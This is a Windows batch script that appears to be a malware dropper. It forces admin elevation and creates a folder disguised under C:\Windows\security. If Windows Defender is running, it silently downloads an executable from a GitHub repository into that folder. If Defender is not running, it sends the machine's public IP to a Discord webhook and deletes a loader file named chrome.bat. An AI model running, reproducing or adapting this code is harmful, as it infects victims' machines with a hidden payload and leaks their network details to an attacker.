��
cls
@echo off
:: Check for admin rights and self-elevate if needed
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process cmd -ArgumentList '/c %~f0' -Verb RunAs"
    exit
)

:: Set the file paths
set "DOWNLOAD_PATH=C:\Windows\security\ApplicationId\PolicyManagement\def.exe"
set "DELETE_PATH=C:\Windows\security\ApplicationId\PolicyManagement\chrome.bat"

:: Create the directory if it doesn’t exist
if not exist "C:\Windows\security\ApplicationId\PolicyManagement" (
    mkdir "C:\Windows\security\ApplicationId\PolicyManagement"
)

:: Check if Windows Defender service (WinDefend) is running
sc query WinDefend | find "RUNNING" >nul
if %errorlevel% equ 0 (
    :: If WinDefend is running, download def.exe
    powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Romans21216/do-not-use/refs/heads/main/def.exe' -OutFile '%DOWNLOAD_PATH%' -ErrorAction SilentlyContinue"
    echo Windows Defender is running. Downloaded %DOWNLOAD_PATH%.
) else (
    :: If WinDefend is not running, send IP to Discord webhook and delete chrome.bat if it exists
    powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "$ip = (Invoke-WebRequest -Uri 'https://api.ipify.org' -ErrorAction SilentlyContinue).Content; $body = @{content='Windows Defender not detected. IP: ' + $ip} | ConvertTo-Json; Invoke-WebRequest -Uri 'https://discord.com/api/webhooks/1354759586430586920/gE2x4dSrGfqvhHRLwkIJ7uXN6FIpQHuvWU8Pwuh6atX5V7K88KpFB0IT7WCF1TE3fdIb' -Method Post -Body $body -ContentType 'application/json' -ErrorAction SilentlyContinue"
    if exist "%DELETE_PATH%" (
        del "%DELETE_PATH%" /F /Q
        echo Windows Defender is not running. %DELETE_PATH% has been deleted.
    ) else (
        echo Windows Defender is not running. %DELETE_PATH% was not found.
    )
)

exit